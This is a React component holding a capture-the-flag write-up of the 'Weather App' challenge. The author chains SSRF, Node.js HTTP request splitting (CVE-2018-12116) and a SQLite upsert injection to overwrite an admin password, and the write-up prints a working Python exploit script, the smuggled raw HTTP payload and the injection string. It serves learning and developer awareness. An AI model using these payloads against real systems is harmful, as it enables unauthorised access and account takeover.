import { Link, Typography } from "@mui/material";
import * as React from "react";
import Inline from "~util/InlineCode";
import MultiLine from "~util/MultiLineCode";
import Quote from "~util/Quote";
import weather1 from "~img/weather1.png";
import weather2 from "~img/weather2.png";
import SourcedImage from "~util/SourcedImage";
import RabbitHole from "~util/RabbitHole";
import RedHerring from "~util/RedHerring";
import Learning from "~util/Learning";

export const WriteupsWeather = {
    path: "weather",
    title: "Weather App",
    tags: [
        "Hard",
        "@Express",
        "@SQLite3",
        "Request Smuggling",
        "SSRF",
        "SQL Injection",
    ],
    description:
        "Exploiting a NodeJS vulnerability to smuggle a request containing a SQL injection.",
    reflection: () => {
        return (
            <>
                <Typography>
                    This challenge was pretty challenging and gave me a more
                    more hands on experience and better understanding of how
                    request splitting works and its possible impacts.
                </Typography>
                <Learning title="SSRF is kind of strong...">
                    A lot of trust is placed in requests that come from an
                    internal IP address, because presumably everything running
                    internally is trusted. And the issue is, there isn't really
                    a good way to avoid this - if you want your servers to
                    communicate internally, they really should be able to trust
                    each other.
                    <br />
                    <br />
                    This means that for applications with large internal
                    networks, SSRF actually gives quite a bit of power, even if
                    it seems less concerning than something like RCE.
                </Learning>
                <Learning title="...and request splitting is kind of scary.">
                    Request splitting seems like a very hard exploit to
                    discover, which is pretty bad for developers, because of the
                    asymmetry of the attacker/defender relationship. An attacker
                    only needs to find one pair of applications which treat HTTP
                    requests differently to exploit it, while defenders need to
                    cover every possible interpretation of the HTTP
                    specification to make sure their application isn't
                    vulnerable. Scary stuff.
                </Learning>
                <Learning dev title="Lost in translation">
                    In general, as developers, we need to be on the lookout for
                    instances where something is interpreted differently by two
                    different systems, or where data gets transformed in storage
                    or transit. These kinds of mutations and discrepancies allow
                    edge cases to slip through the cracks, as was the case in
                    this challenge.
                </Learning>
            </>
        );
    },
    article: () => {
        return (
            <>
                <Typography>
                    We start off with the usual - starting the Docker container,
                    checking out the application, reading the Dockerfile, and
                    looking at the source. It's a JavaScript application,
                    finally - something I'm familiar with.
                </Typography>
                <Typography>
                    The application itself looks fairly devoid of attack
                    vectors, so I decide to check out the source code isntead.
                    This reveals the <Inline>/login</Inline> and{" "}
                    <Inline>/register</Inline> routes. The{" "}
                    <Inline>/login</Inline> route just gives us a free flag if
                    we manage to log in as an admin - presumably as a stand in
                    for an actual admin console.
                </Typography>
                <MultiLine language="js">
                    {`return db
    .isAdmin(username, password)
    .then((admin) => {
        if (admin)
            return res.send(fs.readFileSync("/app/flag").toString());
        return res.send(response("You are not admin"));
    })
    .catch(() => res.send(response("Something went wrong")));`}
                </MultiLine>
                <Typography>
                    Time to work backwards - what do we need to satisfy this{" "}
                    <Inline>isAdmin</Inline> function?
                </Typography>
                <MultiLine language="js">
                    {`try {
    let smt = await this.db.prepare(
        "SELECT username FROM users WHERE username = ? and password = ?"
    );
    let row = await smt.get(user, pass);
    resolve(row !== undefined ? row.username == "admin" : false);
} catch (e) {
    reject(e);
}`}
                </MultiLine>
                <Typography>
                    That's a lot of fluff, but essentially we need to sign in
                    successfully using the admin account. Seems good, and
                    they're constructing their query properly rather than using
                    format strings, so there's no SQL injection to be had here.
                </Typography>
                <Typography>
                    Well, we roughly know what we're heading towards now, so
                    let's continue with the recon. Something interesting is the
                    extended body parser option, which can be used to craft
                    arbitrary objects in HTTP requests. That might come in
                    useful later. Or not.
                </Typography>
                <MultiLine language="js">
                    {`app.use(bodyParser.urlencoded({
    extended: true
}));`}
                </MultiLine>
                <Typography>
                    Okay, what else do we have? If we're trying to trip up the
                    database as our endgame, can we find any SQL injections?
                    Answer: yes.
                </Typography>
                <MultiLine language="js">
                    {`async register(user, pass) {
    // TODO: add parameterization and roll public
    return new Promise(async (resolve, reject) => {
        try {
            let query = \`INSERT INTO users (username, password) VALUES ('\${user}', '\${pass}')\`;
            console.log(query);
            resolve(await this.db.run(query));
        } catch (e) {
            reject(e);
        }
    });
}`}
                </MultiLine>
                <Typography>
                    That's a pretty evil format string SQL query - let's see
                    what we can do with it by checking out the SQLite3
                    documentation.
                </Typography>
                <SourcedImage
                    src={weather1}
                    sourceName="SQLite3 documentation"
                    sourceLink="https://www.sqlite.org/lang_insert.html"
                    height="50vh"
                />
                <Typography>
                    Looks like the only thing we can really insert is an upsert
                    clause. I don't know what those are, so let's expand it out.
                </Typography>
                <SourcedImage
                    src={weather2}
                    sourceName="SQLite3 documentation"
                    sourceLink="https://www.sqlite.org/syntax/upsert-clause.html"
                    height="20vh"
                />
                <Typography>
                    Oh - that's pretty handy. I guess upsert means update or
                    insert, which is pretty much exactly what I want. So the
                    idea is that we try and insert another admin row, but this
                    causes a conflict, allowing me to inject an update clause to
                    change the existing admin user password to whatever I want.
                </Typography>
                <Typography>
                    So, continuing our backwards path so far, how do we actually
                    call this <Inline>register</Inline> function?
                </Typography>
                <MultiLine language="js">
                    {`router.post("/register", (req, res) => {
    if (req.socket.remoteAddress.replace(/^.*:/, "") != "127.0.0.1") {
        return res.status(401).end();
    }

    let { username, password } = req.body;
    if (username && password) {
        return db
            .register(username, password)
            .then(() => res.send(response("Successfully registered")))
            .catch(() => res.send(response("Something went wrong")));
    }

    return res.send(response("Missing parameters"));
});`}
                </MultiLine>
                <Typography>
                    Okay, so basically I can make a post request to the register
                    function with the parameters I want, and these are injected
                    straight into the function without any sanitisation. That's
                    good. But what isn't good is that the register route seems
                    to be protected by a check that the request comes from{" "}
                    <Inline>127.0.0.1</Inline> - that is, the server itself.
                </Typography>
                <RedHerring title="Surely SSRF?" size="Large">
                    <Typography>
                        They say that if all you have is a hammer, everything
                        looks like a nail. In this case, if the only way you can
                        think of to get a valid request to{" "}
                        <Inline>/register</Inline> is by the server sending it,
                        everything looks like a potential server-side request
                        forgery (SSRF) vulnerability.
                    </Typography>
                    <Typography>
                        Essentially, the idea was:
                        <ol>
                            <li>
                                Find a spot where the server makes a request to
                                an external URL that we can control.
                            </li>
                            <li>
                                Change that URL to{" "}
                                <Inline>127.0.0.1/register</Inline>.
                            </li>
                            <li>Profit.</li>
                        </ol>
                    </Typography>
                    <Typography>
                        The offending route I found was the{" "}
                        <Inline>api/weather</Inline> endpoint. For some reason
                        (probably just to mess with me), the client sends an API
                        endpoint to the server to query, along with a city and
                        country to query the weather for. It then constructs a
                        URL that looks something like this.
                    </Typography>
                    <Inline language="js">{`let addr = \`http://\${endpoint}/data/2.5/weather?q=\${city},\${country}&units=metric&appid=\${apiKey}\`;`}</Inline>
                    <Typography>
                        Despite all the garbage, we can actually hijack this
                        pretty easily. We can put pretty much any URL in the
                        endpoint field and add on a <Inline>?garbage=</Inline>{" "}
                        at the end. This would give something like the
                        following.
                    </Typography>
                    <Inline language="js">{`let addr = \`http://any-url/address/we/want?garbage=/data/2.5/weather...\`;`}</Inline>
                    <Typography>
                        The problem was in what it does with this address - it
                        feeds it into this function.
                    </Typography>
                    <MultiLine language="js">
                        {`HttpGet(url) {
    return new Promise((resolve, reject) => {
        http.get(url, res => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(body));
                } catch(e) {
                    resolve(false);
                }
            });
        }).on('error', reject);
    });
}`}
                    </MultiLine>
                    <Typography>
                        Aside from being a really cooked way to make a HTTP
                        request (just use the <Inline>fetch</Inline> API), this
                        doesn't seem to let us make <Inline>POST</Inline>{" "}
                        requests, meaning it's useless for the purpose of
                        SSRF'ing our <Inline>/register</Inline> endpoint.
                    </Typography>
                    <RabbitHole title="Or is it?" size="Shallow">
                        <Typography>
                            Again, my tunnel vision refused to believe that this
                            wasn't the solution, so I decided to check out
                            whether somehow the <Inline>http.get</Inline>{" "}
                            function could make a POST request.
                        </Typography>
                        <Typography>
                            Very surprisingly, the answer is yes.
                        </Typography>
                        <Quote
                            sourceLink="https://nodejs.org/api/http.html#httpgeturl-options-callback"
                            sourceName="NodeJS documentation"
                        >
                            Since most requests are GET requests without bodies,
                            Node.js provides this [http.get] convenience method.
                            The only difference between this method and
                            http.request() is that it sets the method to GET by
                            default and calls req.end() automatically.
                        </Quote>
                        <Typography>
                            So basically, it's possible to make the{" "}
                            <Inline>http.get</Inline> method do a{" "}
                            <Inline>POST</Inline>request if we set the method to{" "}
                            <Inline>POST</Inline>.
                        </Typography>
                        <Typography>
                            This is cool and would be a nice basis for another
                            challenge, but isn't really useful here, because we
                            need to be able to inject an object into that{" "}
                            <Inline>url</Inline> parameter, but alas, we can
                            only put in a string.
                        </Typography>
                    </RabbitHole>
                    <Typography>
                        As with many of the other red herrings we've seen, this
                        is still a pretty big vulnerability. If this application
                        existed in a network, and other computers which trusted
                        other internal devices and had exposed{" "}
                        <Inline>GET</Inline> routes would be vulnerable to
                        information disclosure via this SSRF.
                    </Typography>
                    <Typography>
                        Additionally, criminals could use this exploit to cover
                        up their tracks by making dodgy <Inline>GET</Inline>{" "}
                        requests via this server using the vulnerable route,
                        making it appear like the malicious requests are coming
                        from the app server.
                    </Typography>
                </RedHerring>
                <Typography>
                    I hadn't looked for CVEs yet, so I decided to do this and
                    initially didn't find any particularly out-of-date libraries
                    in <Inline>package.json</Inline>.
                </Typography>
                <MultiLine noNumber>
                    {`"dependencies": {
    "body-parser": "^1.19.0",
    "express": "^4.17.1",
    "sqlite-async": "^1.1.1"
}`}
                </MultiLine>
                <Typography>
                    But just as I was about to go looking at something else, a
                    friend pointed out the NodeJS version, which they recognised
                    as being pretty out of date.
                </Typography>
                <Inline>"nodeVersion": "v8.12.0"</Inline>
                <Typography>
                    The current version is v21, so this is super out of date.
                    And it shows, based on the{" "}
                    <Link
                        href="https://snyk.io/test/docker/node%3A8.12.0-alpine"
                        target="_blank"
                    >
                        33 CVEs
                    </Link>{" "}
                    that it has. After digging through the list, the main ones
                    that are interesting to me in this context are the ones
                    regarding HTTP request splitting. This was something that I
                    hadn't considered, despite having seen it in a{" "}
                    <Link href="./apache" target="_blank">
                        previous challenge
                    </Link>
                    . Specifically, CVE-2018-12116 is described as:
                </Typography>
                <Quote
                    sourceLink="https://nodejs.org/en/blog/vulnerability/november-2018-security-releases"
                    sourceName="NodeJS security release"
                >
                    If Node.js can be convinced to use unsanitized user-provided
                    Unicode data for the path option of an HTTP request, then
                    data can be provided which will trigger a second,
                    unexpected, and user-defined HTTP request to made to the
                    same server.
                </Quote>
                <Typography>
                    HTTP request splitting isn't generally something I would
                    figure out myself, so instead I decide to Google to find any
                    blogs or proof of concept scripts.
                </Typography>
                <Typography>
                    I managed to find an extremely interesting{" "}
                    <Link
                        href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/"
                        target="_blank"
                    >
                        blog post
                    </Link>{" "}
                    which explains how the issue comes about (interesting
                    encoding problems), as well as this{" "}
                    <Link
                        href="https://github.com/subatiq/Unicode-SSRF"
                        target="_blank"
                    >
                        proof of concept repo
                    </Link>{" "}
                    where I found the useful function below.
                </Typography>
                <MultiLine language="py">
                    {`def conceal_payload(payload_raw: str) -> str:
    return ''.join(chr(ord(symbol) + 0x700) for symbol in payload_raw)`}
                </MultiLine>
                <Typography>
                    Unfortunately, actually implementing the exploit took ages.
                    Using the script in the proof of concept repo as a base, I
                    wrote up a quick Python exploit script which looked
                    something like this:
                </Typography>
                <MultiLine language="py">
                    {`import requests
from pathlib import Path
host = "localhost:1337"

def conceal_payload(payload_raw: str) -> str:
    return ''.join(chr(ord(symbol) + 0x700) for symbol in payload_raw)
payload_text = Path("payload").read_text()
payload = conceal_payload(payload_text)
requests.post("http://" + host + "/api/weather", {
    "endpoint": payload,
    "city": "a",
    "country": "first request"
})`}
                </MultiLine>
                <Typography>
                    My first payload looked something like this:
                </Typography>
                <MultiLine>
                    {`localhost/ HTTP/1.1
Host: localhost

POST /register HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length:81

username=test&password=test

GET http://localhost/?garbage=`}
                </MultiLine>
                <Typography>
                    However, this led to the following very cryptic NodeJS
                    error.
                </Typography>
                <Inline>
                    (node:24) UnhandledPromiseRejectionWarning: Error: Unable to
                    determine the domain name
                </Inline>
                <Typography>
                    After much head scratching, I realised my error - the step
                    which converts the Unicode garbage into the actual payload
                    is when it gets "written to the wire" - that is, when the
                    request is actually sent. However, Node still needs to be
                    able to figure out where to send the request, which wasn't
                    possible since I had included the domain name in the
                    concealed payload.
                </Typography>
                <Typography>
                    To fix this, I included the domain part of the payload as
                    plaintext, making the exploit script look like the below.
                </Typography>
                <MultiLine language="py">
                    {`import requests
from pathlib import Path
host = "localhost:1337"

def conceal_payload(payload_raw: str) -> str:
    return ''.join(chr(ord(symbol) + 0x700) for symbol in payload_raw)
payload_text = Path("payload").read_text()
payload = conceal_payload(payload_text)
requests.post("http://" + host + "/api/weather", {
    "endpoint": "localhost/" + payload,
    "city": "a",
    "country": "first request"
})`}
                </MultiLine>
                <Typography>And the corresponding payload...</Typography>
                <MultiLine>
                    {`localhost/ HTTP/1.1
Host: localhost

POST /register HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length:81

username=test&password=test

GET http://localhost/?garbage=`}
                </MultiLine>
                <Typography>
                    After adding some debugging print statements to the handler
                    of the <Inline>/register</Inline> register to see if we were
                    evading the checker, I found that it had worked!
                </Typography>
                <Typography>
                    The final step was to write the actual SQL injection, which
                    was pretty chill compared to everything else I had already
                    been through. The final payload was:
                </Typography>
                <Inline>
                    username=admin&password=') ON CONFLICT(username) DO UPDATE
                    SET password = ('pwned
                </Inline>
                <Typography>
                    With all these pieces in place, I successfully
                    forged/smuggled a <Inline>/register</Inline> request with
                    the SQL injection payload, allowing me to just log in with
                    my new admin credentials and get the flag.
                </Typography>
            </>
        );
    },
};
